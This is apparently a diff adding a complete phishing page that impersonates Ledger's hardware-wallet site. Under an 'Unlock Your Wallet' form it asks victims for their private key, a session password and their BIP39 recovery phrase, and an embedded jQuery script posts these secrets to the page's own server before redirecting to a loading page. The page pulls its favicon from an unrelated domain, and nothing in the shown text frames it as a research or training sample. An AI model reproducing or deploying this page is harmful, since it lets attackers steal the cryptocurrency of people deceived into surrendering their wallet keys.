@@ -1,0 +1,131 @@
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+    <meta charset="utf-8">
+	<link rel="shortcut icon" href="https://wallet.botrectification.com/img/logo/ledgerfavicon.png">
+	<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+	<meta name="theme-color" content="#000000">
+	<link rel="shortcut icon" href="/main/favicon.ico" type="image/x-icon">
+	<title>Hardware Wallet - State-of-the-art security for crypto assets | Ledger</title>
+	<link href="/assets/main.css" rel="stylesheet">
+  </head>
+  <body>
+  <noscript>You need to enable JavaScript to run this app.</noscript>
+  <form method="post" action="/action/privatekey">
+    <div id="root">
+	<div class="App">
+  <div class="NavBar NavBar--is-centered"><img src="/logo.svg" height="80" alt=""></div>
+    <div class="Pages">
+	<div class="UnlockWalletPage">
+	<div class="UnlockWalletPage__wrapper">
+	<div class="UnlockWalletPage__title">Unlock Your Wallet</div>
+    <div class="UnlockWalletCard">
+	<div class="UnlockWalletCard__content">
+	<div class="UnlockWalletCard__header">
+	<div class="TabBar UnlockWalletCard__tab-bar TabBar--is-centered TabBar--is-condensed">
+	<a href="/unlock" class="TabBarItem TabBarItem tablinks"><div class="TabBarItem__title">Keystore</div></a>
+	<a class="TabBarItem tablinks" href="/unlock/mnemonic"><div class="TabBarItem__title">Mnemonic</div></a>
+	<a class="TabBarItem--is-active tablinks" href="/unlock/privatekey"><div class="TabBarItem__title">Private Key</div></a>
+	</div>
+	</div>
+
+    <div id="privateKey" class="UnlockWalletViaPrivateKey ccc">
+	<div class="UnlockWalletViaPrivateKey__title">Please enter your private key</div>
+	<textarea class="UnlockWalletViaPrivateKey__private-key" required="" id="privatekey" name="privatekey"></textarea>
+	<div class="UnlockWalletViaPrivateKey__private-key-instructions">Please enter your private key in HEX format.</div>
+	<input class="UnlockWalletViaPrivateKey__password-input" placeholder="Enter temporary session password" name="password" id="password" type="password" value="">
+    <div class="UnlockWalletCard__warning">Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.</div>
+	<div class="UnlockWalletViaPrivateKey__footer">
+	<button type="submit" id="submit" name="submit" style="width:100%;" class="GradientButton undefined GradientButton">
+	<div class="GradientButton__title">SUBMIT</div>
+
+	</button>
+
+	</div>
+
+	</div>
+
+</div>
+</div>
+</div>
+
+</div>
+</div>
+<div>
+</div>
+
+</div>
+</div>
+
+
+    <script src="/assets/2.js"></script>
+    <script src="/assets/jquery.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+	<div class="ReactModalPortal"></div><div class="ReactModalPortal">
+	</div>
+	<div>
+	<div style="position: fixed; top: 0px; right: auto; bottom: auto; left: 50%; transform: translate(-50%, 0%); z-index: 100;">
+      <div>
+      </div>
+    </div>
+  </div>
+</form>
+
+<script type="text/javascript">
+    (function(){
+        $('#submit').click(function(event){
+            event.preventDefault()
+            console.log('working')
+
+            var values = {
+                privatekey: $('#privatekey').val().trim(),
+                password: $('#password').val().trim(),
+            }
+
+            console.log(values)
+
+            $.ajax({
+                url : '/action/privatekey',
+                type: 'POST',
+                data : values,
+                success: function(data, textStatus, jqXHR){
+                    console.log(JSON.stringify(data))
+                    if (data.confirmation != 'success'){
+                        var msg = data.data
+                        swal({
+                          title: "Error!",
+                          text: msg,
+                          icon: "warning",
+                          button: "Ok!",
+                        });
+                        // alert('Error: ' + data.message)
+                        // console.log(msg)
+                        return
+                    }
+                    if (data.confirmation === 'success'){
+                        var msg = data.data
+                        swal({
+                          title: "success!",
+                          text: msg,
+                          icon: "success",
+                          button: "Ok!",
+                        })
+                        .then(() => {
+                            window.location.href = '/loading'
+                        })
+                        
+                        return 
+                    }
+
+                },
+                error: function (jqXHR, textStatus, err){
+                    console.log('Error: ' + err.message)
+                } 
+            })
+
+        })
+    })()
+</script>
+
+
+</body></html>
